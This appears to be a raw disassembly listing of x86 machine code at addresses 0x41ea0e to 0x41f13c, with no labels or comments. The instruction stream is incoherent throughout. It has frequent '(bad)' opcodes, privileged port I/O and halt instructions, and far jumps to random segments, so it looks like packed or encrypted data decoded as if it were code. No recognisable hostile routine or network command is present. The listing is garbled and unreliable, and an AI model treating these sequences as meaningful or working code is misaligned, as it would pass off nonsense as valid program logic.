  41ea0e:	aam    0xad
  41ea10:	pop    esp
  41ea11:	(bad)  
  41ea12:	cli    
  41ea13:	das    
  41ea14:	nop
  41ea15:	pop    DWORD PTR [ebp+eax*2+0x65a590ab]
  41ea1c:	adc    cl,0x32
  41ea1f:	xchg   ebp,eax
  41ea20:	ins    DWORD PTR es:[edi],dx
  41ea21:	fimul  DWORD PTR [esi+0xa]
  41ea24:	pop    ss
  41ea25:	lahf   
  41ea26:	inc    edi
  41ea27:	pop    eax
  41ea28:	cmc    
  41ea29:	fldcw  WORD PTR [ecx]
  41ea2b:	mov    dl,0x6f
  41ea2d:	add    ch,BYTE PTR [ecx]
  41ea2f:	mov    ebx,0x6830b5b
  41ea34:	imul   eax,DWORD PTR [esi-0x2d],0xffffff98
  41ea38:	xor    BYTE PTR [ecx+ebx*8],ah
  41ea3b:	or     DWORD PTR [esi-0x3c],ebx
  41ea3e:	push   es
  41ea3f:	mov    edi,0x946104e2
  41ea44:	in     eax,0x28
  41ea46:	xor    ebx,DWORD PTR [edi+ecx*4]
  41ea49:	fsubr  QWORD PTR [ecx-0x5a93b53a]
  41ea4f:	jg     0x41ea68
  41ea51:	cmp    eax,0x615c3fb9
  41ea56:	lock mov eax,ds:0x19c66ba6
  41ea5c:	stc    
  41ea5d:	sub    BYTE PTR [ebx],dh
  41ea5f:	pop    ebx
  41ea60:	lea    esp,[ecx+0x62323362]
  41ea66:	fcom   QWORD PTR [ebx-0x6ef3646]
  41ea6c:	sub    BYTE PTR [ebx-0x8],dh
  41ea6f:	fadd   DWORD PTR [ebx]
  41ea71:	xchg   edx,eax
  41ea72:	and    ah,dh
  41ea74:	and    esi,DWORD PTR [eax+0x4a]
  41ea77:	je     0x41ea94
  41ea79:	ins    DWORD PTR es:[edi],dx
  41ea7a:	inc    edx
  41ea7b:	test   al,0x98
  41ea7d:	outs   dx,BYTE PTR ds:[esi]
  41ea7e:	xor    al,0xe4
  41ea80:	and    ch,BYTE PTR [esi-0x1db68484]
  41ea86:	push   esi
  41ea87:	retf   0xa925
  41ea8a:	fs jns 0x41ea7f
  41ea8d:	push   es
  41ea8e:	loopne 0x41ea28
  41ea90:	mov    ds:0x54840bb5,al
  41ea95:	push   eax
  41ea96:	cmp    BYTE PTR [edx-0x2950b0d2],ch
  41ea9c:	cmp    bl,0x26
  41ea9f:	stc    
  41eaa0:	mov    bl,0x23
  41eaa2:	push   0x2839fa7e
  41eaa7:	fstp   st(0)
  41eaa9:	std    
  41eaaa:	jno    0x41ea6e
  41eaac:	xchg   ebp,eax
  41eaad:	iret   
  41eaae:	dec    ecx
  41eaaf:	lahf   
  41eab0:	or     BYTE PTR ds:0x21ec,bh
  41eab5:	xchg   esp,eax
  41eab6:	imul   esp,ecx,0x7f
  41eab9:	push   ebx
  41eaba:	jo     0x41ea85
  41eabc:	ss add dl,bh
  41eabf:	add    BYTE PTR [ebp-0x480db15e],0xa6
  41eac6:	rcr    BYTE PTR [esi],1
  41eac8:	mov    ds:0x5738487d,al
  41eacd:	mov    WORD PTR [esi],?
  41eacf:	adc    eax,0xf5b5146d
  41ead4:	fidivr WORD PTR [edx]
  41ead6:	push   0xffffffaf
  41ead8:	xchg   edx,eax
  41ead9:	push   ebx
  41eada:	jne    0x41eade
  41eadc:	mov    ds:0xbbf0f47a,al
  41eae1:	test   dh,ah
  41eae3:	add    ebp,ebx
  41eae5:	cli    
  41eae6:	nop
  41eae7:	mov    DWORD PTR [ecx+eax*2-0x3d],edx
  41eaeb:	lock jno 0x41eb6a
  41eaee:	mov    ecx,0xb5f561ce
  41eaf3:	fld    DWORD PTR [ebp+0x7b]
  41eaf6:	aad    0x73
  41eaf8:	sbb    ah,BYTE PTR [edx-0x6a061bb2]
  41eafe:	(bad)  
  41eaff:	in     al,dx
  41eb00:	icebp  
  41eb01:	fnstenv [ecx]
  41eb03:	mov    ds:0xc48c05d7,eax
  41eb08:	loop   0x41eb76
  41eb0a:	jecxz  0x41eac3
  41eb0c:	jbe    0x41eb51
  41eb0e:	inc    DWORD PTR [edi]
  41eb10:	mov    cl,0x3e
  41eb12:	mov    eax,0x19fbf220
  41eb17:	push   edx
  41eb18:	mov    esi,DWORD PTR [eax+ecx*4-0x52]
  41eb1c:	sub    al,0x5f
  41eb1e:	pop    edx
  41eb1f:	xor    edx,DWORD PTR [esi-0x1849b690]
  41eb25:	xor    ah,BYTE PTR [ebp+0xfc13eb4]
  41eb2b:	clc    
  41eb2c:	dec    esi
  41eb2d:	mov    DWORD PTR [edx],edx
  41eb2f:	sub    al,0xd2
  41eb31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb32:	scas   al,BYTE PTR es:[edi]
  41eb33:	test   ah,cl
  41eb35:	adc    bl,BYTE PTR es:[edi-0x60]
  41eb39:	mov    ch,0x4b
  41eb3b:	mov    al,ds:0xbbf7640b
  41eb40:	ret    
  41eb41:	dec    ebx
  41eb42:	loop   0x41ebc0
  41eb44:	mov    BYTE PTR [edi-0x7668a1a3],cl
  41eb4a:	inc    ebx
  41eb4b:	fdiv   QWORD PTR [edi+0x5f697e51]
  41eb51:	pop    edi
  41eb52:	and    DWORD PTR [ebx],esp
  41eb54:	js     0x41eba6
  41eb56:	pop    ebx
  41eb57:	mov    ch,BYTE PTR [ebx+0x61]
  41eb5a:	xchg   BYTE PTR [esi-0x4],cl
  41eb5d:	xchg   ebx,eax
  41eb5e:	mov    ebp,0x74273f3
  41eb63:	pop    edx
  41eb64:	and    BYTE PTR [ebp+0x49f8b1c],dh
  41eb6a:	pop    edi
  41eb6b:	hlt    
  41eb6c:	inc    eax
  41eb6d:	mov    ?,WORD PTR [esi]
  41eb6f:	ins    DWORD PTR es:[edi],dx
  41eb70:	rol    DWORD PTR [esp+esi*1],1
  41eb73:	pop    ecx
  41eb74:	addr16 (bad) 
  41eb76:	es and eax,0x6b93f8e8
  41eb7c:	push   edx
  41eb7d:	scas   eax,DWORD PTR es:[edi]
  41eb7e:	cmp    BYTE PTR [ebp+edi*1+0x1d47c611],bh
  41eb85:	(bad)  
  41eb86:	retf   
  41eb87:	je     0x41eb85
  41eb89:	mov    bl,0x6e
  41eb8b:	lods   al,BYTE PTR ds:[esi]
  41eb8c:	pop    edi
  41eb8d:	sub    esi,0x1d19d29d
  41eb93:	push   esi
  41eb94:	daa    
  41eb95:	out    0x19,al
  41eb97:	in     eax,0xa7
  41eb99:	pop    esi
  41eb9a:	outs   dx,DWORD PTR ds:[esi]
  41eb9b:	xchg   edx,eax
  41eb9c:	cmp    al,0xeb
  41eb9e:	jb     0x41eb9c
  41eba0:	mov    ebp,0x431a0ca9
  41eba5:	lods   al,BYTE PTR ds:[esi]
  41eba6:	push   ebp
  41eba7:	push   ebx
  41eba8:	idiv   DWORD PTR [ebx-0x24]
  41ebab:	(bad)  
  41ebac:	cwde   
  41ebad:	shl    BYTE PTR [esi+0x44628347],0x7c
  41ebb4:	mov    dh,BYTE PTR [ecx-0x7786b89a]
  41ebba:	cs (bad) 
  41ebbc:	in     eax,dx
  41ebbd:	xor    esp,DWORD PTR [ebx-0x125958ac]
  41ebc3:	test   eax,0x3d522e1f
  41ebc8:	shr    DWORD PTR [ebp-0x10],0xe4
  41ebcc:	dec    edi
  41ebcd:	jmp    0xeb7b:0xf65140e8
  41ebd4:	jl     0x41ebc9
  41ebd6:	ja     0x41ec4c
  41ebd8:	stos   BYTE PTR es:[edi],al
  41ebd9:	test   BYTE PTR [edx+0x176fb9ea],dl
  41ebdf:	ins    BYTE PTR es:[edi],dx
  41ebe0:	pop    ebx
  41ebe1:	push   es
  41ebe2:	xchg   ah,bh
  41ebe4:	pop    DWORD PTR [ecx-0x7d247359]
  41ebea:	and    DWORD PTR [edx],0x5d
  41ebed:	icebp  
  41ebee:	mov    esp,0xb9187c86
  41ebf3:	sub    eax,0xe1730e77
  41ebf8:	jns    0x41ec65
  41ebfa:	stos   BYTE PTR es:[edi],al
  41ebfb:	retf   
  41ebfc:	ret    0x64e8
  41ebff:	imul   cl
  41ec01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec02:	scas   eax,DWORD PTR es:[edi]
  41ec03:	dec    esi
  41ec04:	sub    esp,DWORD PTR [ebx+0x6e]
  41ec07:	pushf  
  41ec08:	das    
  41ec09:	jb     0x41ec6d
  41ec0b:	cld    
  41ec0c:	out    dx,al
  41ec0d:	(bad)  
  41ec11:	push   esi
  41ec12:	xchg   BYTE PTR [esp+eax*2],cl
  41ec15:	sub    eax,0x7df1f744
  41ec1a:	dec    eax
  41ec1b:	inc    ebx
  41ec1c:	xchg   DWORD PTR [ebp-0x39],edx
  41ec1f:	cwde   
  41ec20:	imul   eax,DWORD PTR [edx-0x21c6af2],0x4aee3b10
  41ec2a:	ficomp WORD PTR [edi]
  41ec2c:	mov    dh,0xa2
  41ec2e:	push   esi
  41ec2f:	ret    
  41ec30:	cmp    dh,ch
  41ec32:	jge    0x41ebd9
  41ec34:	fld    TBYTE PTR [edi]
  41ec36:	push   esp
  41ec37:	sbb    eax,0x412d85f6
  41ec3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec3d:	repnz mov edi,0x3075c5eb
  41ec43:	xchg   edx,eax
  41ec44:	push   0xd602e171
  41ec49:	mov    DWORD PTR [ebx+0x40212b7e],eax
  41ec4f:	inc    edi
  41ec50:	adc    DWORD PTR [eax+0x7c90de0e],esi
  41ec56:	popf   
  41ec57:	inc    ecx
  41ec58:	cmp    eax,0x82efb415
  41ec5d:	pop    esp
  41ec5e:	cmp    al,0xd3
  41ec60:	ja     0x41ec04
  41ec62:	mov    eax,ds:0x650e3a71
  41ec67:	dec    edi
  41ec68:	xor    ecx,DWORD PTR [edi+0x34]
  41ec6b:	mov    cl,0xef
  41ec6d:	sub    BYTE PTR cs:[edi-0x7502990f],ah
  41ec74:	popa   
  41ec75:	jl     0x41ecab
  41ec77:	mov    bh,0xb1
  41ec79:	les    edx,FWORD PTR [edx-0x8]
  41ec7c:	pop    ecx
  41ec7d:	add    dl,dh
  41ec7f:	and    eax,0xa151fa48
  41ec84:	stc    
  41ec85:	mov    ebx,0x9e4a21e1
  41ec8a:	mov    cl,0x8c
  41ec8c:	or     al,0xaa
  41ec8e:	mov    al,ds:0x38e0edcc
  41ec93:	call   0xe70c:0x3c9883d0
  41ec9a:	pushf  
  41ec9b:	mov    ds,edx
  41ec9d:	ret    
  41ec9e:	loopne 0x41ecd6
  41eca0:	imul   ebp,DWORD PTR [ecx],0x2d533d3e
  41eca6:	dec    ebp
  41eca7:	jne    0x41ecf6
  41eca9:	mov    al,ds:0xdb72e857
  41ecae:	ror    DWORD PTR [ebp+0x396c6cd],0xce
  41ecb5:	mov    edi,0xfd67632a
  41ecba:	in     eax,0x79
  41ecbc:	mov    DWORD PTR [esi-0x39654acf],edi
  41ecc2:	in     eax,dx
  41ecc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecc4:	jae    0x41eceb
  41ecc6:	mov    ds,WORD PTR [edx+0x3de84d95]
  41eccc:	outs   dx,DWORD PTR ds:[esi]
  41eccd:	ins    BYTE PTR es:[edi],dx
  41ecce:	pop    es
  41eccf:	(bad)  
  41ecd0:	repz jmp 0x41ed48
  41ecd3:	shl    BYTE PTR [ebx],cl
  41ecd5:	or     bl,BYTE PTR [ecx-0xe]
  41ecd8:	rcl    DWORD PTR [ecx],0xa2
  41ecdb:	bound  ebp,QWORD PTR [eax-0x29380528]
  41ece1:	out    0xe5,eax
  41ece3:	jp     0x41ece6
  41ece5:	int    0x22
  41ece7:	mov    ch,0x2e
  41ece9:	jecxz  0x41ec6c
  41eceb:	aas    
  41ecec:	enter  0x7b46,0x7b
  41ecf0:	sbb    bh,BYTE PTR [ebx+esi*1-0x15]
  41ecf4:	xlat   BYTE PTR ds:[bx]
  41ecf6:	ss ja  0x41ec9a
  41ecf9:	out    dx,al
  41ecfa:	loop   0x41ed79
  41ecfc:	or     al,0xf0
  41ecfe:	fiadd  WORD PTR [edi]
  41ed00:	imul   eax,edi,0x48
  41ed03:	jg     0x41ed67
  41ed05:	cwde   
  41ed06:	pushf  
  41ed07:	pop    ds
  41ed08:	mov    bl,0x59
  41ed0a:	sbb    edx,edx
  41ed0c:	stos   BYTE PTR es:[edi],al
  41ed0d:	sahf   
  41ed0e:	push   esp
  41ed0f:	loopne 0x41ecaf
  41ed11:	mov    ?,WORD PTR [ebx]
  41ed13:	dec    eax
  41ed14:	(bad)  
  41ed15:	dec    ebx
  41ed16:	pop    edi
  41ed17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed18:	addr16 dec eax
  41ed1a:	js     0x41ecdd
  41ed1c:	jge    0x41ecfb
  41ed1e:	inc    edi
  41ed1f:	(bad)  
  41ed20:	sahf   
  41ed21:	ficomp DWORD PTR [esi]
  41ed23:	mov    al,0x89
  41ed25:	scas   al,BYTE PTR es:[edi]
  41ed26:	in     al,0x2d
  41ed28:	clc    
  41ed29:	pop    esp
  41ed2a:	rol    edi,0xff
  41ed2d:	into   
  41ed2e:	push   esp
  41ed2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed30:	push   0x0
  41ed32:	jge    0x41ecbf
  41ed34:	lea    esi,[edi+edi*8]
  41ed37:	push   ss
  41ed38:	stos   DWORD PTR es:[edi],eax
  41ed39:	and    esi,DWORD PTR [esi-0x2]
  41ed3c:	(bad)  
  41ed3d:	cld    
  41ed3e:	dec    ecx
  41ed3f:	pop    ebp
  41ed40:	jle    0x41ecfa
  41ed42:	pop    es
  41ed43:	sub    esp,DWORD PTR [ebp-0x5b]
  41ed46:	out    dx,eax
  41ed47:	xor    al,0xb7
  41ed49:	mov    bh,0x86
  41ed4b:	dec    esp
  41ed4c:	fs adc edi,esp
  41ed4f:	and    dh,BYTE PTR [esi-0x1ff829d7]
  41ed55:	sub    esi,ecx
  41ed57:	xor    eax,0x722ed2dd
  41ed5c:	sub    edx,DWORD PTR [ecx+edx*4+0x6e5941d4]
  41ed63:	retf   0x87e5
  41ed66:	ins    BYTE PTR es:[edi],dx
  41ed67:	jmp    edi
  41ed69:	dec    DWORD PTR [edx+0x77e1afba]
  41ed6f:	push   ebx
  41ed70:	and    al,0x8e
  41ed72:	fwait
  41ed73:	shl    dl,cl
  41ed75:	and    esp,DWORD PTR [edi+0x0]
  41ed78:	add    al,0x7b
  41ed7a:	in     eax,0x3d
  41ed7c:	jmp    0x41ed78
  41ed7e:	popa   
  41ed7f:	jb     0x41ed8b
  41ed81:	dec    bh
  41ed83:	ror    dh,1
  41ed85:	lock xchg ebx,eax
  41ed87:	das    
  41ed88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed89:	pop    edx
  41ed8a:	sub    al,0x18
  41ed8c:	cmp    bl,ah
  41ed8e:	add    BYTE PTR ds:0x2da9e2c5,bl
  41ed94:	cmc    
  41ed95:	jne    0x41ed57
  41ed97:	pop    ebp
  41ed98:	add    al,0xf9
  41ed9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed9b:	jno    0x41edd4
  41ed9d:	cmp    dl,al
  41ed9f:	jge    0x41ed7c
  41eda1:	mov    dh,0x6c
  41eda3:	cmp    edx,DWORD PTR [ecx+eiz*8]
  41eda6:	retf   
  41eda7:	jle    0x41eded
  41eda9:	xchg   edi,eax
  41edaa:	cmp    eax,0x7ae50dce
  41edaf:	addr16 jbe 0x41ed78
  41edb2:	cwde   
  41edb3:	pushf  
  41edb4:	mov    eax,0x1e0e83d1
  41edb9:	push   ss
  41edba:	(bad)  
  41edbb:	cs mov esi,0x47cbf118
  41edc1:	(bad)  
  41edc2:	(bad)  
  41edc3:	mov    esi,0x66d38b51
  41edc8:	mov    ebp,0xfac76a9e
  41edcd:	paddq  mm5,QWORD PTR [edi-0x7d]
  41edd1:	es loop 0x41ee42
  41edd4:	mov    dl,0x7c
  41edd6:	mov    esi,0xa98951dd
  41eddb:	add    DWORD PTR [ebx-0x30],0xab630c44
  41ede2:	cld    
  41ede3:	shl    DWORD PTR [eax+0x75],0xe1
  41ede7:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ede9:	or     cl,BYTE PTR [edx+ecx*8-0x1d]
  41eded:	pop    ss
  41edee:	mov    ebx,0x2e69a91e
  41edf3:	and    al,al
  41edf5:	jb     0x41edb4
  41edf7:	mov    ecx,0x989ed06a
  41edfc:	dec    ebp
  41edfd:	cmp    al,0xc8
  41edff:	sbb    DWORD PTR [ecx+0x33],0x2e
  41ee03:	jbe    0x41ed88
  41ee05:	adc    dl,bh
  41ee07:	ins    DWORD PTR es:[edi],dx
  41ee08:	sub    ebx,DWORD PTR [ecx+0x55]
  41ee0b:	mov    ch,0x9c
  41ee0d:	adc    BYTE PTR [esi+0x37742aab],dh
  41ee13:	xor    dl,BYTE PTR ds:0x811c20f5
  41ee19:	ror    BYTE PTR [esi],1
  41ee1b:	adc    BYTE PTR [ecx-0x1e58563f],dl
  41ee21:	call   0x5d54:0x53a82869
  41ee28:	outs   dx,DWORD PTR ds:[esi]
  41ee29:	fsub   QWORD PTR [esi-0x5a]
  41ee2c:	lock int 0x9d
  41ee2f:	inc    ecx
  41ee30:	bound  ebp,QWORD PTR [ecx-0x799165e6]
  41ee36:	cs stc 
  41ee38:	jmp    0xc5b7:0x76ec1c38
  41ee3f:	pusha  
  41ee40:	popa   
  41ee41:	cmp    ebp,DWORD PTR [edx]
  41ee43:	mov    al,ds:0xad4d5917
  41ee48:	dec    ecx
  41ee49:	mov    esp,0xc3fc9a32
  41ee4e:	adc    ecx,ebp
  41ee50:	or     ah,ch
  41ee52:	icebp  
  41ee53:	xlat   BYTE PTR ds:[ebx]
  41ee54:	retf   
  41ee55:	enter  0xdd6a,0xa5
  41ee59:	imul   edi,DWORD PTR [edx+0x14],0xffffffbb
  41ee5d:	pop    edx
  41ee5e:	retf   
  41ee5f:	out    dx,eax
  41ee60:	retf   
  41ee61:	out    dx,eax
  41ee62:	pop    edi
  41ee63:	push   0xffffffae
  41ee65:	cdq    
  41ee66:	pop    ebx
  41ee67:	cmp    BYTE PTR [ecx+0x32b9a805],dh
  41ee6d:	int3   
  41ee6e:	sti    
  41ee6f:	jae    0x41ee9c
  41ee71:	pushf  
  41ee72:	dec    ebx
  41ee73:	dec    eax
  41ee74:	jge    0x41eed8
  41ee76:	sbb    DWORD PTR [edx+0x7a],0x708dd6bf
  41ee7d:	loope  0x41ee71
  41ee7f:	aam    0x97
  41ee81:	imul   edx,DWORD PTR [eax],0x669b63ba
  41ee87:	jecxz  0x41ee46
  41ee89:	retf   
  41ee8a:	pop    eax
  41ee8b:	mov    cl,0x2a
  41ee8d:	mov    DWORD PTR [ecx-0x67],esi
  41ee90:	inc    ecx
  41ee91:	fwait
  41ee92:	jecxz  0x41eeed
  41ee94:	sub    DWORD PTR cs:[ebx+0x6a],edx
  41ee98:	adc    edx,0xffffffc6
  41ee9b:	mov    ch,BYTE PTR [ebp+0x51]
  41ee9e:	pop    eax
  41ee9f:	(bad)  
  41eea0:	xor    eax,0x99a9e05f
  41eea5:	inc    esi
  41eea6:	ret    0x4203
  41eea9:	mov    ebx,0x1ab165b2
  41eeae:	mov    edx,0x4aa12703
  41eeb3:	mov    BYTE PTR [ebx],al
  41eeb5:	in     eax,dx
  41eeb6:	mov    dh,0x32
  41eeb8:	jmp    0x92e6:0xc0a66274
  41eebf:	loope  0x41ee9b
  41eec1:	dec    esi
  41eec2:	mov    dl,0x32
  41eec4:	mov    BYTE PTR [eax-0x4c],al
  41eec7:	or     eax,0xcfb37fd8
  41eecc:	dec    eax
  41eecd:	sub    bl,BYTE PTR [edi+0x2175c11]
  41eed3:	fadd   QWORD PTR [edi+0x7e]
  41eed6:	addr16 jle 0x41ef0e
  41eed9:	fs mov edx,0xb6106dbc
  41eedf:	dec    esi
  41eee0:	les    esi,FWORD PTR ds:0x6179991e
  41eee6:	dec    edi
  41eee7:	scas   eax,DWORD PTR es:[edi]
  41eee8:	adc    eax,DWORD PTR [eax]
  41eeea:	or     dh,BYTE PTR [edi-0xb3c1ef3]
  41eef0:	pop    esi
  41eef1:	test   al,0xeb
  41eef3:	jno    0x41eebb
  41eef5:	mov    ebx,0xfe5cde29
  41eefa:	inc    edx
  41eefb:	jle    0x41eea0
  41eefd:	ret    
  41eefe:	pop    ebx
  41eeff:	inc    esp
  41ef00:	out    0x6,eax
  41ef02:	popf   
  41ef03:	mov    ebx,0xd8584f18
  41ef08:	das    
  41ef09:	or     ch,BYTE PTR [edx+edi*8]
  41ef0c:	lods   eax,DWORD PTR ds:[esi]
  41ef0d:	idiv   BYTE PTR [edx-0x73]
  41ef10:	in     eax,dx
  41ef11:	dec    ebp
  41ef12:	out    dx,eax
  41ef13:	add    ah,BYTE PTR [ebx]
  41ef15:	mov    ecx,0x7b3a9f0e
  41ef1a:	adc    al,0x7f
  41ef1c:	fnstsw WORD PTR [edi-0x4cf91f1d]
  41ef22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef23:	test   esp,esi
  41ef25:	scas   al,BYTE PTR es:[edi]
  41ef26:	(bad)  
  41ef27:	fbstp  TBYTE PTR [edi-0x21d25082]
  41ef2d:	add    DWORD PTR [esi+0x2f73f8a8],0x8bb8bb5c
  41ef37:	mov    dl,BYTE PTR [edx]
  41ef39:	sub    DWORD PTR [edi-0x72],esp
  41ef3c:	fisttp WORD PTR [eax-0x6b]
  41ef3f:	lock imul ebx,DWORD PTR [eax-0x7770a587],0xffffffd9
  41ef47:	(bad)  
  41ef48:	mov    cs,eax
  41ef4a:	jmp    0x57b7:0x103ea00d
  41ef51:	jg     0x41ef92
  41ef53:	push   ebp
  41ef54:	dec    edi
  41ef55:	or     al,0x32
  41ef57:	pop    esp
  41ef58:	es inc edx
  41ef5a:	sbb    esi,esi
  41ef5c:	(bad)  
  41ef5d:	jb     0x41ef00
  41ef5f:	out    0x2b,al
  41ef61:	lds    esi,FWORD PTR [eax+0xd]
  41ef64:	push   ecx
  41ef65:	rcl    BYTE PTR [ebp+0x1f8ee126],1
  41ef6b:	mov    WORD PTR [esi+0x2e16cd67],gs
  41ef71:	scas   al,BYTE PTR es:[edi]
  41ef72:	scas   eax,DWORD PTR es:[edi]
  41ef73:	sbb    DWORD PTR [esi+0x77],0x4b
  41ef77:	xor    DWORD PTR [ebp+0x5a],edx
  41ef7a:	and    cl,cl
  41ef7c:	in     al,0x79
  41ef7e:	push   edx
  41ef7f:	test   al,0x9d
  41ef81:	add    DWORD PTR [esi],0xffffffc6
  41ef84:	out    0x7b,al
  41ef86:	and    dh,cl
  41ef88:	sar    DWORD PTR [esi],1
  41ef8a:	adc    edx,DWORD PTR [ebx]
  41ef8c:	and    eax,0xc7f72fbc
  41ef91:	or     eax,0xf3d69327
  41ef96:	sbb    edx,esi
  41ef98:	push   esp
  41ef99:	fldenv [edx-0x5035e521]
  41efa0:	in     eax,dx
  41efa1:	ror    dh,0xec
  41efa4:	jmp    0x7a4:0xb85754b7
  41efab:	dec    edx
  41efac:	out    0xe9,eax
  41efae:	loop   0x41ef91
  41efb0:	ja     0x41f014
  41efb2:	out    dx,al
  41efb3:	mov    DWORD PTR [eax-0x37b883f2],ebx
  41efb9:	sub    ch,BYTE PTR ds:0x2954deea
  41efbf:	loope  0x41efe3
  41efc1:	outs   dx,DWORD PTR ds:[esi]
  41efc2:	fdivr  st(1),st
  41efc4:	iret   
  41efc5:	jg     0x41ef7c
  41efc7:	loop   0x41f03e
  41efc9:	mov    eax,0x82e694bb
  41efce:	fstp   QWORD PTR [ecx+0x2768c331]
  41efd4:	xor    BYTE PTR [ebp-0x5b2a2add],0x5e
  41efdb:	test   eax,0x7e559c82
  41efe0:	jnp    0x41efa3
  41efe2:	pop    esi
  41efe3:	dec    ebx
  41efe4:	inc    ebx
  41efe5:	xor    bl,al
  41efe7:	sti    
  41efe8:	adc    bl,BYTE PTR [edx]
  41efea:	ret    0x5978
  41efed:	mov    ecx,esi
  41efef:	pusha  
  41eff0:	or     DWORD PTR [si],ebx
  41eff3:	inc    edi
  41eff4:	pop    edi
  41eff5:	pop    esp
  41eff6:	mov    dh,0x72
  41eff8:	dec    ebp
  41eff9:	mov    ah,0x57
  41effb:	adc    BYTE PTR [edx],0x41
  41effe:	add    ebx,DWORD PTR ds:0xafb41db
  41f004:	aas    
  41f005:	mov    al,0x0
  41f007:	retf   
  41f008:	xchg   ebx,eax
  41f009:	aaa    
  41f00a:	(bad)  
  41f00b:	aaa    
  41f00c:	outs   dx,DWORD PTR ds:[esi]
  41f00d:	adc    dl,dl
  41f00f:	adc    al,0xd8
  41f011:	sub    DWORD PTR [ebp-0x34],edi
  41f014:	pop    ss
  41f015:	and    WORD PTR fs:[esi],cx
  41f019:	dec    ebx
  41f01a:	mov    bl,0xd5
  41f01c:	push   ds
  41f01d:	jle    0x41efad
  41f01f:	xor    al,0xf0
  41f021:	mov    WORD PTR [ecx+0x4b9652a9],ds
  41f027:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f028:	push   ebx
  41f029:	xchg   ecx,eax
  41f02a:	pop    edx
  41f02b:	inc    edi
  41f02c:	or     eax,0x5ff4ead4
  41f031:	pop    ecx
  41f032:	fisttp WORD PTR [edi]
  41f034:	and    esi,eax
  41f036:	push   ebp
  41f037:	jge    0x41f00a
  41f039:	and    DWORD PTR [ebx],ebx
  41f03b:	push   esp
  41f03c:	jecxz  0x41f048
  41f03e:	and    BYTE PTR [edi+0x58],ch
  41f041:	add    ah,BYTE PTR [esp+eiz*4-0x2f]
  41f045:	inc    edx
  41f046:	mov    ecx,0x762d1201
  41f04b:	mov    bl,0x3d
  41f04d:	inc    ecx
  41f04e:	xchg   ebx,eax
  41f04f:	enter  0xdc8,0x2b
  41f053:	dec    ebp
  41f054:	outs   dx,BYTE PTR ds:[esi]
  41f055:	mov    ch,0x99
  41f057:	test   eax,0x9bef4a25
  41f05c:	sbb    BYTE PTR [ebp-0x52],al
  41f05f:	push   eax
  41f060:	outs   dx,DWORD PTR ds:[esi]
  41f061:	push   esp
  41f062:	mov    ?,WORD PTR [eax]
  41f064:	sahf   
  41f065:	pop    ds
  41f066:	js     0x41eff6
  41f068:	loop   0x41f019
  41f06a:	rcl    DWORD PTR ss:[ebx-0x40],0x1b
  41f06f:	add    al,0x14
  41f071:	in     al,dx
  41f072:	sub    esp,DWORD PTR [ebx-0xa]
  41f075:	ins    BYTE PTR es:[edi],dx
  41f076:	push   ss
  41f077:	cmc    
  41f078:	loop   0x41f0e9
  41f07a:	call   0x7d6d:0xcb008f2f
  41f081:	outs   dx,BYTE PTR ds:[esi]
  41f082:	mov    ah,0xf7
  41f084:	inc    ebp
  41f085:	dec    ecx
  41f086:	(bad)  
  41f087:	cmp    cl,BYTE PTR [ecx]
  41f089:	or     al,0xc0
  41f08b:	or     esp,DWORD PTR [edx-0x5e96f7f]
  41f091:	ror    DWORD PTR [edx],1
  41f093:	push   edi
  41f094:	jle    0x41f030
  41f096:	sub    cl,dl
  41f098:	sbb    eax,esp
  41f09a:	in     eax,dx
  41f09b:	xchg   esi,eax
  41f09c:	leave  
  41f09d:	mov    DWORD PTR [ebp+esi*2+0x6e],ebx
  41f0a1:	out    0xa7,al
  41f0a3:	punpckhwd mm0,mm4
  41f0a6:	cmp    BYTE PTR [esi-0x31],bh
  41f0a9:	push   ebx
  41f0ab:	cdq    
  41f0ac:	repnz pusha 
  41f0ae:	mov    edx,0xd01e20ce
  41f0b3:	inc    DWORD PTR [edi-0x38]
  41f0b6:	inc    ebp
  41f0b7:	mov    dh,0x55
  41f0b9:	clc    
  41f0ba:	and    BYTE PTR [esi+ecx*1],bl
  41f0bd:	push   eax
  41f0be:	nop
  41f0bf:	xchg   edi,eax
  41f0c0:	xchg   edi,eax
  41f0c1:	rol    BYTE PTR [eax],cl
  41f0c3:	pop    esi
  41f0c4:	add    al,BYTE PTR [ebp-0x50]
  41f0c7:	mov    bl,0x41
  41f0c9:	push   ebp
  41f0ca:	lds    esp,FWORD PTR [ebx]
  41f0cc:	mov    edi,ecx
  41f0ce:	repnz fwait
  41f0d0:	cmp    DWORD PTR [esi-0x2853809f],esi
  41f0d6:	enter  0xe74a,0x8
  41f0da:	jg     0x41f085
  41f0dc:	jmp    0xfa784135
  41f0e1:	mov    ebx,0x4f6d3c1a
  41f0e6:	xchg   ebx,eax
  41f0e7:	icebp  
  41f0e8:	mov    dh,0x3e
  41f0ea:	mov    ds:0x9602c150,eax
  41f0ef:	lahf   
  41f0f0:	mov    DWORD PTR [edx-0x44],edx
  41f0f3:	mov    bl,0xcd
  41f0f5:	fbld   TBYTE PTR [ecx]
  41f0f7:	dec    ecx
  41f0f8:	out    dx,al
  41f0f9:	nop
  41f0fa:	cmc    
  41f0fb:	dec    ebp
  41f0fc:	in     eax,dx
  41f0fd:	sub    al,0x9a
  41f0ff:	sbb    dh,BYTE PTR [ecx]
  41f101:	call   0x77828a48
  41f106:	out    0x60,al
  41f108:	repnz shl DWORD PTR [esi],1
  41f10b:	fisttp WORD PTR [esp+edx*2-0x3619adf2]
  41f112:	lock push ds
  41f114:	mov    edx,0x631dfb60
  41f119:	dec    ebp
  41f11a:	aam    0xb4
  41f11c:	jns    0x41f0f3
  41f11e:	cmp    edi,edx
  41f120:	(bad)  
  41f121:	push   edx
  41f122:	adc    eax,0x69cf2967
  41f127:	inc    esi
  41f128:	mov    edi,0x20a53abf
  41f12d:	xchg   ebx,eax
  41f12e:	dec    ecx
  41f12f:	push   ss
  41f130:	fs hlt 
  41f132:	ret    0x1141
  41f135:	add    eax,0xe87cde9
  41f13a:	sbb    esp,ebp
  41f13c:	into   
